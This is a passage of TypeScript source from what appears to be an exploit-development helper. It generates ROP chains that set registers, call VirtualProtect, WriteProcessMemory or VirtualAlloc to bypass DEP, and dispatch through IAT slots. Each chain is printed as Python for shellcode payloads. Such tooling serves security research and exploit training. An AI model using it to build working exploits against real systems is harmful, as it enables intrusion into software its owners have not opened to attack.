      warnings: plan.warnings,
      errors: plan.badcharViolations,
    });
    return toDxResult(title, rows);
  };

  const executeRopChain = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.chain");
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP Chain", rows);
      setResult({ command: "rop.chain", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
      return toDxResult("ROP Chain", rows);
    }

    const options = isPlainObject(args[0]) ? args[0] : {};
    const positionalTargets: ChainTarget[] = [];
    if (!isPlainObject(args[0])) {
      for (let i = 0; i + 1 < args.length; i += 2) {
        if (typeof args[i] === "string") {
          positionalTargets.push({ register: args[i] as string, value: Number(args[i + 1]) });
        }
      }
    }
    const targets = positionalTargets.length > 0
      ? positionalTargets
      : parseChainTargets(options.set ?? options.targets ?? options);
    if (targets.length === 0) {
      const rows = [{ Error: 'rop.chain requires register/value pairs, e.g. rop.chain("eax", 0xDEADBEEF).' }];
      renderRows("ROP Chain", rows);
      setResult({ command: "rop.chain", args: options, success: false, findings: [], warnings: [], errors: ["No chain targets provided."] });
      return toDxResult("ROP Chain", rows);
    }

    const plan = planRegisterSetup(currentRopCorpus, targets);
    const python = formatChainPython(plan);

    out.section("ROP Chain (register setup)");
    out.info(`Satisfied: ${plan.satisfied.join(", ") || "(none)"} | Stack: ${plan.stackBytes} bytes`);
    for (const line of python) {
      out.print(line);
    }
    const warnings = plan.unsatisfied.map((entry) => `${entry.register}: ${entry.reason}`);
    for (const warning of warnings) {
      out.warn(warning);
    }

    const rows = plan.steps.map((step) => ({
      Word: step.kind === "gadget" ? `0x${step.address!.toString(16).toUpperCase().padStart(8, "0")}` : `0x${(step.value! >>> 0).toString(16).toUpperCase().padStart(8, "0")}`,
      Meaning: step.comment,
    }));
    renderRows("ROP Chain", rows);
    setResult({
      command: "rop.chain",
      args: options,
      success: plan.unsatisfied.length === 0,
      findings: [{ ...plan, python }],
      warnings,
      errors: [],
    });
    return toDxResult("ROP Chain", rows);
  };

  const executeRopConstruct = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.construct");
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("Value Construction", rows);
      setResult({ command: "rop.construct", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
      return toDxResult("Value Construction", rows);
    }
    const constructStale = staleCorpusGuard("Value Construction", "rop.construct");
    if (constructStale) return constructStale;
    const register = typeof args[0] === "string" ? args[0].toLowerCase() : undefined;
    const rawValue = args[1] !== undefined ? Number(args[1]) : NaN;
    const value = Number.isFinite(rawValue) ? rawValue >>> 0 : undefined;
    const badchars = Array.isArray(parseHexByteList(args[2])) ? parseHexByteList(args[2]) as number[] : [];
    const preserve = parseRegisterList(args[3]);
    if (!register || value === undefined) {
      const rows = [{ Error: 'rop.construct requires register and value, e.g. rop.construct("edx", 0x1000, [0x00])' }];
      renderRows("Value Construction", rows);
      setResult({ command: "rop.construct", args: { register, value }, success: false, findings: [], warnings: [], errors: ["Missing register or value."] });
      return toDxResult("Value Construction", rows);
    }
    const recipe = solveValue(currentRopCorpus, register, value, badchars, preserve, buildStableAddressPredicate());
    if (!recipe) {
      const preserveNote = preserve.length > 0 ? ` while preserving ${preserve.join(", ")}` : "";
      const rows = [{ Error: `No arithmetic construction found for ${register} = ${hex32(value)}${preserveNote}` }];
      renderRows("Value Construction", rows);
      setResult({ command: "rop.construct", args: { register, value, badchars, preserve }, success: false, findings: [], warnings: [], errors: [`No recipe found for ${register} = ${hex32(value)}${preserveNote}`] });
      return toDxResult("Value Construction", rows);
    }
    // ret N padding must sit after the following gadget address, not before it.
    recipe.steps = fixRetImmPadding(recipe.steps);
    out.section(`Value Construction: ${register} = ${hex32(value)}`);
    out.info(`Recipe: ${recipe.recipe} | Stack: ${recipe.stackBytes} bytes${recipe.scratchRegister ? ` | Scratch: ${recipe.scratchRegister}` : ""} | Clobbers: ${recipe.clobbers.join(", ")}`);
    // Incidental clobbers = everything the recipe changes besides the target and
    // the (deliberate) scratch register.
    const collateral = recipe.clobbers.filter((r) => r !== register && r !== recipe.scratchRegister);
    if (collateral.length > 0) {
      out.warn(`Side effect: this recipe also changes ${collateral.join(", ")} (harmless unless you need ${collateral.length > 1 ? "them" : "it"} preserved). To keep a register live, pass it as the 4th arg, e.g. rop.construct("${register}", ..., "<badchars>", "${collateral[0]}").`);
    }
    const python = formatChainPython({ steps: recipe.steps });
    for (const line of python) {
      out.print(line);
    }
    const rows = recipe.steps.map((step) => ({
      Type: step.kind,
      Value: step.address !== undefined ? hex32(step.address) : step.value !== undefined ? hex32(step.value) : step.placeholder ?? "",
      Meaning: step.comment,
    }));
    renderRows("Value Construction", rows);
    setResult({
      command: "rop.construct",
      args: { register, value, badchars },
      success: true,
      findings: [{ recipe: recipe.recipe, steps: recipe.steps, scratchRegister: recipe.scratchRegister, stackBytes: recipe.stackBytes, clobbers: recipe.clobbers }],
      warnings: [],
      errors: [],
    });
    return toDxResult("Value Construction", rows);
  };

  const executeRopSetup = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.setup");
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("Register Setup", rows);
      setResult({ command: "rop.setup", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
      return toDxResult("Register Setup", rows);
    }
    const setupStale = staleCorpusGuard("Register Setup", "rop.setup");
    if (setupStale) return setupStale;
    const targets = parseRegisterTargets(args[0]);
    const badchars = Array.isArray(parseHexByteList(args[1])) ? parseHexByteList(args[1]) as number[] : [];
    if (Object.keys(targets).length === 0) {
      const rows = [{ Error: 'rop.setup requires register=value pairs, e.g. rop.setup("edi=0x10001000 ebx=0x40", "00 0A 0D")' }];
      renderRows("Register Setup", rows);
      setResult({ command: "rop.setup", args: {}, success: false, findings: [], warnings: [], errors: ["No target registers."] });
      return toDxResult("Register Setup", rows);
    }
    const plan = planRegisterSetupPacking(currentRopCorpus, targets, badchars, buildStableAddressPredicate());
    out.section(`Register Setup: ${Object.keys(targets).join(", ")}`);
    out.info(`Set ${plan.ordered.length}/${Object.keys(targets).length} register(s) | Stack: ${plan.stackBytes} bytes | Order: ${plan.ordered.join(" -> ") || "n/a"}`);
    if (plan.steps.length > 0) {
      const python = formatChainPython({ steps: plan.steps });
      for (const line of python) out.print(line);
    }
    if (!plan.success) {
      out.warn("Some registers could not be set without clobbering a finalized one:");
      for (const item of plan.unresolved) out.warn(`  ${item.register}: ${item.reason}`);
    }
    const rows: Array<Record<string, string>> = plan.steps.map((step) => ({
      Type: step.kind,
      Value: step.address !== undefined ? hex32(step.address) : step.value !== undefined ? hex32(step.value) : step.placeholder ?? "",
      Meaning: step.comment,
    }));
    if (rows.length === 0) rows.push({ Type: "none", Value: "", Meaning: "no gadgets selected" });
    renderRows("Register Setup", rows);
    setResult({
      command: "rop.setup",
      args: { targets, badchars },
      success: plan.success,
      findings: [{ ordered: plan.ordered, unresolved: plan.unresolved, steps: plan.steps, stackBytes: plan.stackBytes }],
      warnings: plan.unresolved.map((item) => `${item.register}: ${item.reason}`),
      errors: [],
    });
    return toDxResult("Register Setup", rows);
  };

  const executeRopChainVp = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.chain_vp");
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP VirtualProtect Chain", rows);
      setResult({ command: "rop.chain_vp", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
      return toDxResult("ROP VirtualProtect Chain", rows);
    }
    const chainVpStale = staleCorpusGuard("ROP VirtualProtect Chain", "rop.chain_vp");
    if (chainVpStale) return chainVpStale;

    const options = isPlainObject(args[0])
      ? args[0]
      : {
          virtualProtect: args[0],
          retGadget: args[1],
          returnAddress: args[2],
          lpAddress: args[3],
          dwSize: args[4],
          writable: args[5],
          flNewProtect: args[6],
          mode: args[7],
          badchars: args[8],
        };
    const params: VirtualProtectParams = {
      virtualProtect: options.virtualProtect !== undefined ? Number(options.virtualProtect) : undefined,
      retGadget: options.retGadget !== undefined ? Number(options.retGadget) : undefined,
      returnAddress: options.returnAddress !== undefined ? Number(options.returnAddress) : undefined,
      lpAddress: options.lpAddress !== undefined ? Number(options.lpAddress) : undefined,
      dwSize: options.dwSize !== undefined ? Number(options.dwSize) : undefined,
      writable: options.writable !== undefined ? Number(options.writable) : undefined,
      flNewProtect: options.flNewProtect !== undefined ? Number(options.flNewProtect) : undefined,
      mode: options.mode === "direct" ? "direct" : "ret-slide",
      badchars: Array.isArray(parseHexByteList(options.badchars)) ? parseHexByteList(options.badchars) as number[] : undefined,
    };

    const plan = planVirtualProtect(currentRopCorpus, params, planRegisterSetupPacking, buildStableAddressPredicate());
    const python = formatChainPython(plan);
    const sectionLabel = plan.hasPushad
      ? "ROP Chain — VirtualProtect (PUSHAD)"
      : "ROP Register Setup — VirtualProtect (PUSHAD missing)";

    out.section(sectionLabel);
    if (!plan.hasPushad) {
      out.warn("pushad ; ret gadget not found — output is a partial register-setup sketch, not an executable chain. Use frame_vp for a flat stdcall frame instead.");
    }
    out.info(`Mode: ${plan.mode} | Resolved gadgets: ${plan.satisfied.join(", ") || "(none)"} | Stack: ${plan.stackBytes} bytes`);
    if (plan.placeholders.length > 0) {
      out.info(`Define before use: ${plan.placeholders.join(", ")} (e.g. VIRTUALPROTECT via sc.iat_find("VirtualProtect"))`);
    }
    for (const line of python) {
      out.print(line);
    }
    const warnings = [...plan.unsatisfied.map((entry) => `${entry.register}: ${entry.reason}`), ...plan.constraints];
    for (const warning of warnings) {
      out.warn(warning);
    }

    const rows = plan.steps.map((step) => ({
      Word: step.kind === "gadget"
        ? `0x${step.address!.toString(16).toUpperCase().padStart(8, "0")}`
        : step.placeholder ?? `0x${(step.value! >>> 0).toString(16).toUpperCase().padStart(8, "0")}`,
      Meaning: step.comment,
    }));
    renderRows(sectionLabel, rows);
    setResult({
      command: "rop.chain_vp",
      args: options,
      success: plan.hasPushad && plan.unsatisfied.length === 0,
      findings: [{ ...plan, python }],
      warnings,
      errors: [],
    });
    return toDxResult(sectionLabel, rows);
  };

  const executeRopChainWpm = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.chain_wpm");
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP WriteProcessMemory Chain", rows);
      setResult({ command: "rop.chain_wpm", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
      return toDxResult("ROP WriteProcessMemory Chain", rows);
    }
    const chainWpmStale = staleCorpusGuard("ROP WriteProcessMemory Chain", "rop.chain_wpm");
    if (chainWpmStale) return chainWpmStale;

    const options = isPlainObject(args[0])
      ? args[0]
      : {
          writeProcessMemory: args[0],
          returnAddress: args[1],
          lpBuffer: args[2],
          nSize: args[3],
          writable: args[4],
          badchars: args[5],
        };
    const params: WriteProcessMemoryParams = {
      writeProcessMemory: options.writeProcessMemory !== undefined ? Number(options.writeProcessMemory) : undefined,
      returnAddress: options.returnAddress !== undefined ? Number(options.returnAddress) : undefined,
      lpBuffer: options.lpBuffer !== undefined ? Number(options.lpBuffer) : undefined,
      nSize: options.nSize !== undefined ? Number(options.nSize) : undefined,
      writable: options.writable !== undefined ? Number(options.writable) : undefined,
      badchars: Array.isArray(parseHexByteList(options.badchars)) ? parseHexByteList(options.badchars) as number[] : undefined,
    };

    const plan = planWriteProcessMemory(currentRopCorpus, params, planRegisterSetupPacking, buildStableAddressPredicate());
    const python = formatChainPython(plan);
    const sectionLabel = plan.hasPushad
      ? "ROP Chain — WriteProcessMemory (PUSHAD)"
      : "ROP Register Setup — WriteProcessMemory (PUSHAD missing)";

    out.section(sectionLabel);
    if (!plan.hasPushad) {
      out.warn("pushad ; ret gadget not found — output is a partial register-setup sketch, not an executable chain. Use frame_wpm for a flat stdcall frame instead.");
    }
    out.info(`Mode: ${plan.mode} | Resolved gadgets: ${plan.satisfied.join(", ") || "(none)"} | Stack: ${plan.stackBytes} bytes`);
    if (plan.placeholders.length > 0) {
      out.info(`Define before use: ${plan.placeholders.join(", ")}`);
    }
    for (const line of python) {
      out.print(line);
    }
    const warnings = [...plan.unsatisfied.map((entry) => `${entry.register}: ${entry.reason}`), ...plan.constraints];
    for (const warning of warnings) {
      out.warn(warning);
    }

    const rows = plan.steps.map((step) => ({
      Word: step.kind === "gadget"
        ? `0x${step.address!.toString(16).toUpperCase().padStart(8, "0")}`
        : step.placeholder ?? `0x${(step.value! >>> 0).toString(16).toUpperCase().padStart(8, "0")}`,
      Meaning: step.comment,
    }));
    renderRows(sectionLabel, rows);
    setResult({
      command: "rop.chain_wpm",
      args: options,
      success: plan.hasPushad && plan.unsatisfied.length === 0,
      findings: [{ ...plan, python }],
      warnings,
      errors: [],
    });
    return toDxResult(sectionLabel, rows);
  };

  const executeRopChainVa = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.chain_va");
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP VirtualAlloc Chain", rows);
      setResult({ command: "rop.chain_va", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
      return toDxResult("ROP VirtualAlloc Chain", rows);
    }
    const chainVaStale = staleCorpusGuard("ROP VirtualAlloc Chain", "rop.chain_va");
    if (chainVaStale) return chainVaStale;

    const options = isPlainObject(args[0])
      ? args[0]
      : {
          virtualAlloc: args[0],
          returnAddress: args[1],
          lpAddress: args[2],
          flAllocationType: args[3],
          flProtect: args[4],
          badchars: args[5],
        };
    const params: VirtualAllocParams = {
      virtualAlloc: options.virtualAlloc !== undefined ? Number(options.virtualAlloc) : undefined,
      returnAddress: options.returnAddress !== undefined ? Number(options.returnAddress) : undefined,
      lpAddress: options.lpAddress !== undefined ? Number(options.lpAddress) : undefined,
      flAllocationType: options.flAllocationType !== undefined ? Number(options.flAllocationType) : undefined,
      flProtect: options.flProtect !== undefined ? Number(options.flProtect) : undefined,
      badchars: Array.isArray(parseHexByteList(options.badchars)) ? parseHexByteList(options.badchars) as number[] : undefined,
    };

    const plan = planVirtualAlloc(currentRopCorpus, params, planRegisterSetupPacking, buildStableAddressPredicate());
    const python = formatChainPython(plan);
    const sectionLabel = plan.hasPushad
      ? "ROP Chain — VirtualAlloc (PUSHAD)"
      : "ROP Register Setup — VirtualAlloc (PUSHAD missing)";

    out.section(sectionLabel);
    if (!plan.hasPushad) {
      out.warn("pushad ; ret gadget not found — output is a partial register-setup sketch, not an executable chain. Use frame_va for a flat stdcall frame instead.");
    }
    out.info(`Mode: ${plan.mode} | Resolved gadgets: ${plan.satisfied.join(", ") || "(none)"} | Stack: ${plan.stackBytes} bytes`);
    if (plan.placeholders.length > 0) {
      out.info(`Define before use: ${plan.placeholders.join(", ")}`);
    }
    for (const line of python) {
      out.print(line);
    }
    const warnings = [...plan.unsatisfied.map((entry) => `${entry.register}: ${entry.reason}`), ...plan.constraints];
    for (const warning of warnings) {
      out.warn(warning);
    }

    const rows = plan.steps.map((step) => ({
      Word: step.kind === "gadget"
        ? `0x${step.address!.toString(16).toUpperCase().padStart(8, "0")}`
        : step.placeholder ?? `0x${(step.value! >>> 0).toString(16).toUpperCase().padStart(8, "0")}`,
      Meaning: step.comment,
    }));
    renderRows(sectionLabel, rows);
    setResult({
      command: "rop.chain_va",
      args: options,
      success: plan.hasPushad && plan.unsatisfied.length === 0,
      findings: [{ ...plan, python }],
      warnings,
      errors: [],
    });
    return toDxResult(sectionLabel, rows);
  };

  const executeRopFrameVp = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.frame_vp");
    }
    const options = isPlainObject(args[0])
      ? args[0]
      : {
          virtualProtect: args[0],
          returnAddress: args[1],
          lpAddress: args[2],
          dwSize: args[3],
          flNewProtect: args[4],
          writable: args[5],
          badchars: parseHexByteList(args[6]),
        };
    const params: VirtualProtectFrameParams = {
      virtualProtect: options.virtualProtect !== undefined ? Number(options.virtualProtect) : undefined,
      returnAddress: options.returnAddress !== undefined ? Number(options.returnAddress) : undefined,
      lpAddress: options.lpAddress !== undefined ? Number(options.lpAddress) : undefined,
      dwSize: options.dwSize !== undefined ? Number(options.dwSize) : undefined,
      flNewProtect: options.flNewProtect !== undefined ? Number(options.flNewProtect) : undefined,
      writable: options.writable !== undefined ? Number(options.writable) : undefined,
      badchars: parseBadcharsOption(options.badchars),
    };
    return renderFlatFrame("rop.frame_vp", "ROP Frame — VirtualProtect (stdcall)", options, planVirtualProtectFrame(params));
  };

  const executeRopFrameWpm = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.frame_wpm");
    }
    const options = isPlainObject(args[0])
      ? args[0]
      : {
          writeProcessMemory: args[0],
          returnAddress: args[1],
          hProcess: args[2],
          lpBaseAddress: args[3],
          lpBuffer: args[4],
          nSize: args[5],
          writable: args[6],
          badchars: parseHexByteList(args[7]),
        };
    const params: WriteProcessMemoryFrameParams = {
      writeProcessMemory: options.writeProcessMemory !== undefined ? Number(options.writeProcessMemory) : undefined,
      returnAddress: options.returnAddress !== undefined ? Number(options.returnAddress) : undefined,
      hProcess: options.hProcess !== undefined ? Number(options.hProcess) : undefined,
      lpBaseAddress: options.lpBaseAddress !== undefined ? Number(options.lpBaseAddress) : undefined,
      lpBuffer: options.lpBuffer !== undefined ? Number(options.lpBuffer) : undefined,
      nSize: options.nSize !== undefined ? Number(options.nSize) : undefined,
      writable: options.writable !== undefined ? Number(options.writable) : undefined,
      badchars: parseBadcharsOption(options.badchars),
    };
    return renderFlatFrame("rop.frame_wpm", "ROP Frame — WriteProcessMemory (stdcall)", options, planWriteProcessMemoryFrame(params));
  };

  const executeRopFrameVa = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.frame_va");
    }
    const options = isPlainObject(args[0])
      ? args[0]
      : {
          virtualAlloc: args[0],
          returnAddress: args[1],
          lpAddress: args[2],
          dwSize: args[3],
          flAllocationType: args[4],
          flProtect: args[5],
          badchars: parseHexByteList(args[6]),
        };
    const params: VirtualAllocFrameParams = {
      virtualAlloc: options.virtualAlloc !== undefined ? Number(options.virtualAlloc) : undefined,
      returnAddress: options.returnAddress !== undefined ? Number(options.returnAddress) : undefined,
      lpAddress: options.lpAddress !== undefined ? Number(options.lpAddress) : undefined,
      dwSize: options.dwSize !== undefined ? Number(options.dwSize) : undefined,
      flAllocationType: options.flAllocationType !== undefined ? Number(options.flAllocationType) : undefined,
      flProtect: options.flProtect !== undefined ? Number(options.flProtect) : undefined,
      badchars: parseBadcharsOption(options.badchars),
    };
    return renderFlatFrame("rop.frame_va", "ROP Frame — VirtualAlloc (stdcall)", options, planVirtualAllocFrame(params));
  };

  const parseFrameWordToken = (token: string): FrameWord => {
    const t = token.trim();
    // [0xSLOT] / [SLOT] -> dereference the IAT slot at runtime (ASLR-proof API address).
    const deref = /^\[\s*(0x)?([0-9a-fA-F]+)\s*\]$/.exec(t);
    if (deref) return { derefSlot: parseInt(deref[2], 16) >>> 0, comment: `*0x${deref[2]}` };
    if (/^0x[0-9a-fA-F]+$/.test(t)) return { value: parseInt(t, 16) >>> 0, comment: t };
    if (/^[0-9]+$/.test(t)) return { value: Number(t) >>> 0, comment: t };
    // A bare hex-digit token missing its 0x prefix (has a-f, so it can't be a
    // decimal) is a mistyped address, NOT a symbolic placeholder. Interpret it as
    // hex — never emit it raw as an undefined symbol.
    if (/^[0-9a-fA-F]+$/.test(t)) {
      return { value: parseInt(t, 16) >>> 0, comment: `0x${t} (assumed hex — no 0x prefix)`, assumedHex: true };
    }
    return { placeholder: t.toUpperCase(), comment: t };
  };

  const executeRopFrameWrite = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.frame_write");
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP Write Frame", rows);
      setResult({ command: "rop.frame_write", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
      return toDxResult("ROP Write Frame", rows);
    }
    const stale = staleCorpusGuard("ROP Write Frame", "rop.frame_write");
    if (stale) return stale;

    const bufToken = typeof args[0] === "string" ? args[0].trim() : undefined;
    const wordsSpec = typeof args[1] === "string" ? args[1] : undefined;
    const badchars = Array.isArray(parseHexByteList(args[2])) ? parseHexByteList(args[2]) as number[] : [];
    const words = (wordsSpec ?? "").split(/[\s,]+/).filter((w) => w.length > 0).map(parseFrameWordToken);
    if (!bufToken || words.length === 0) {
      const rows = [{ Error: 'rop.frame_write requires a buffer and ordered frame words, e.g. rop.frame_write("BUF", "VIRTUALALLOC POST_CALL 0x0 0x1000 0x3000 0x40", "00 0A 0D")' }];
      renderRows("ROP Write Frame", rows);
      setResult({ command: "rop.frame_write", args: {}, success: false, findings: [], warnings: [], errors: ["Missing buffer or frame words."] });
      return toDxResult("ROP Write Frame", rows);
    }
    const buf = /^0x[0-9a-fA-F]+$/.test(bufToken)
      ? { value: parseInt(bufToken, 16) >>> 0 }
      : { placeholder: bufToken.toUpperCase() };

    const plan = planWriteFrame(currentRopCorpus, buf, words, badchars, buildStableAddressPredicate());

    out.section("ROP Write Frame (no PUSHAD)");
    for (const w of words) {
      if (w.assumedHex) out.warn(`Frame word "${w.comment.split(" ")[0]}" had no 0x prefix — assumed hex ${hex32(BigInt(w.value!))}. Add 0x to be explicit.`);
    }
    if (plan.success) {
      const g = plan.gadgets;
      out.info(`Store: ${g.store !== undefined ? hex32(g.store) : "?"} | Advance: ${g.advance !== undefined ? hex32(g.advance) : "n/a"} | Pivot: ${g.pivot !== undefined ? hex32(g.pivot) : "?"} | Stack: ${plan.stackBytes} bytes`);
      if (plan.placeholders.length > 0) out.info(`Define before use: ${plan.placeholders.join(", ")}`);
      out.info("Frame layout (built in BUF, then ESP pivots onto it):");
      words.forEach((w, i) => {
        const shown = w.derefSlot !== undefined ? `*${hex32(w.derefSlot)}` : w.placeholder ?? hex32(w.value!);
        out.print(`  BUF+0x${(i * 4).toString(16).padStart(2, "0")} = ${shown}  (${i === 0 ? "API (ret dispatches here)" : i === 1 ? "post-call target — MUST be executable" : `arg${i - 1}`})`);
      });
      const python = formatChainPython({ steps: plan.steps });
      for (const line of python) out.print(line);
    }
    for (const u of plan.unsatisfied) out.warn(u);
    if (!plan.success && plan.unsatisfied.length === 0) out.warn("No frame produced.");

    const rows: Array<Record<string, string>> = plan.steps.map((step) => ({
      Type: step.kind,
      Value: step.address !== undefined ? hex32(step.address) : step.value !== undefined ? hex32(step.value) : step.placeholder ?? "",
      Meaning: step.comment,
    }));
    if (rows.length === 0) rows.push({ Type: "none", Value: "", Meaning: plan.unsatisfied[0] ?? "no frame" });
    renderRows("ROP Write Frame", rows);
    setResult({
      command: "rop.frame_write",
      args: { buf: bufToken, words: words.length, badchars },
      success: plan.success,
      findings: [{ steps: plan.steps, gadgets: plan.gadgets, placeholders: plan.placeholders }],
      warnings: plan.unsatisfied,
      errors: [],
    });
    return toDxResult("ROP Write Frame", rows);
  };

  const executeRopSlotCall = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.slot_call");
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP Slot Call", rows);
      setResult({ command: "rop.slot_call", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
      return toDxResult("ROP Slot Call", rows);
    }
    const stale = staleCorpusGuard("ROP Slot Call", "rop.slot_call");
    if (stale) return stale;

    const bufToken = typeof args[0] === "string" ? args[0].trim() : undefined;
    const slotToken = typeof args[1] === "string" ? args[1].trim() : undefined;
    const frameSpec = typeof args[2] === "string" ? args[2] : undefined;
    const badchars = Array.isArray(parseHexByteList(args[3])) ? parseHexByteList(args[3]) as number[] : [];
    const entrySkew = args[4] !== undefined ? Number(args[4]) : 0;
    if (!Number.isFinite(entrySkew) || entrySkew < 0 || entrySkew % 4 !== 0) {
      const rows = [{ Error: `entrySkew must be a non-negative multiple of 4 (bytes the vuln's ret adds to ESP; e.g. 4 for 'ret 4'). Got: ${String(args[4])}` }];
      renderRows("ROP Slot Call", rows);
      setResult({ command: "rop.slot_call", args: {}, success: false, findings: [], warnings: [], errors: ["Invalid entrySkew."] });
      return toDxResult("ROP Slot Call", rows);
    }
    const slot = slotToken && /^(0x)?[0-9a-fA-F]+$/.test(slotToken)
      ? parseInt(slotToken, 16) >>> 0
      : undefined;
    const frame = (frameSpec ?? "").split(/[\s,]+/).filter((w) => w.length > 0).map(parseFrameWordToken);
    if (!bufToken || slot === undefined || frame.length === 0) {
      const rows = [{ Error: 'rop.slot_call requires a buffer, an IAT slot, and a frame (retaddr + args), e.g. rop.slot_call("0x00420000", "0x1005D060", "SHELLCODE SHELLCODE 0x1000 0x1000 0x40", "00 0A 0D")' }];
      renderRows("ROP Slot Call", rows);
      setResult({ command: "rop.slot_call", args: {}, success: false, findings: [], warnings: [], errors: ["Missing buffer, slot, or frame words."] });
      return toDxResult("ROP Slot Call", rows);
    }
    const buf = /^0x[0-9a-fA-F]+$/.test(bufToken)
      ? { value: parseInt(bufToken, 16) >>> 0 }
      : { placeholder: bufToken.toUpperCase() };

    const plan = planSlotDispatch(currentRopCorpus, buf, slot, frame, badchars, buildStableAddressPredicate(), entrySkew);

    out.section("ROP Slot Call (deref IAT slot + jmp <reg> dispatch)");
    if (entrySkew > 0) out.info(`Entry skew: ${entrySkew} bytes (vuln ret ${entrySkew}) -> ${entrySkew / 4} filler dword(s) after the entry gadget.`);
    for (const w of frame) {
      if (w.assumedHex) out.warn(`Frame word "${w.comment.split(" ")[0]}" had no 0x prefix — assumed hex ${hex32(BigInt(w.value!))}. Add 0x to be explicit.`);
    }
    if (plan.success) {
      const d = plan.dispatch;
      const pr = d.ptrReg ?? "reg";
      const vr = d.valReg ?? "reg";
      out.info(`Deref preamble: pop ${pr} ${d.popPtr !== undefined ? hex32(d.popPtr) : "?"} -> [${hex32(BigInt(d.slot))}] via mov ${vr},[${pr}] ${d.deref !== undefined ? hex32(d.deref) : "?"} -> jmp ${vr} ${d.jmp !== undefined ? hex32(d.jmp) : "?"}`);
      if (d.unstable.length > 0) out.warn(`Preamble gadget(s) at a NON-stable address (will break if the module relocates): ${d.unstable.join(", ")}`);
      out.info(`Stack: ${plan.stackBytes} bytes${plan.placeholders.length > 0 ? ` | Define before use: ${plan.placeholders.join(", ")}` : ""}`);
      out.info("Frame layout (built in BUF, then ESP pivots onto it):");
      out.print(`  BUF+0x00 = ${hex32(BigInt(Number(d.popPtr)))}  (pop ${pr} ; ret)`);
      out.print(`  BUF+0x04 = ${hex32(BigInt(d.slot))}  (IAT slot -> popped into ${pr})`);
      out.print(`  BUF+0x08 = ${hex32(BigInt(Number(d.deref)))}  (mov ${vr},[${pr}] ; ret -> ${vr} = live API)`);
      out.print(`  BUF+0x0c = ${hex32(BigInt(Number(d.jmp)))}  (jmp ${vr} -> dispatch)`);
      frame.forEach((w, i) => {
        const shown = w.derefSlot !== undefined ? `*${hex32(w.derefSlot)}` : w.placeholder ?? hex32(w.value!);
        const role = i === 0 ? "API return target — MUST be executable" : `arg${i}`;
        out.print(`  BUF+0x${((i + 4) * 4).toString(16).padStart(2, "0")} = ${shown}  (${role})`);
      });
      const python = formatChainPython({ steps: plan.steps });
      for (const line of python) out.print(line);
    }
    for (const u of plan.unsatisfied) out.warn(u);
    if (!plan.success && plan.unsatisfied.length === 0) out.warn("No chain produced.");

    const rows: Array<Record<string, string>> = plan.steps.map((step) => ({
      Type: step.kind,
      Value: step.address !== undefined ? hex32(step.address) : step.value !== undefined ? hex32(step.value) : step.placeholder ?? "",
      Meaning: step.comment,
    }));
    if (rows.length === 0) rows.push({ Type: "none", Value: "", Meaning: plan.unsatisfied[0] ?? "no chain" });
    renderRows("ROP Slot Call", rows);
    setResult({
      command: "rop.slot_call",
      args: { buf: bufToken, slot: hex32(BigInt(slot)), frame: frame.length, badchars },
      success: plan.success,
      findings: [{ steps: plan.steps, dispatch: plan.dispatch, placeholders: plan.placeholders }],
      warnings: [...plan.unsatisfied, ...plan.dispatch.unstable.map((u) => `non-stable preamble gadget: ${u}`)],
      errors: [],
    });
    return toDxResult("ROP Slot Call", rows);
  };

  const executeRopApiPlan = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") return helperHelp("rop.api_plan");
    const target = typeof args[0] === "string" ? args[0].trim() : "";
    const badchars = parseBadcharsOption(args[1]);
    if (!target) {
      const rows = [{ Error: 'rop.api_plan requires an API name, e.g. rop.api_plan("KERNEL32!WriteProcessMemory", "00 0A 0D")' }];
      renderRows("ROP API Resolution Planner", rows);
      setResult({ command: "rop.api_plan", args: {}, success: false, findings: [], warnings: [], errors: ["Missing target API."] });
      return toDxResult("ROP API Resolution Planner", rows);
    }
    const snapshot = sc.api_plan(target, badchars);
    if (snapshot.error || !snapshot.target || !snapshot.targetIdentity) {
      const message = snapshot.error ?? "No target export was resolved.";
      const rows = [{ Error: message }];
      renderRows("ROP API Resolution Planner", rows);
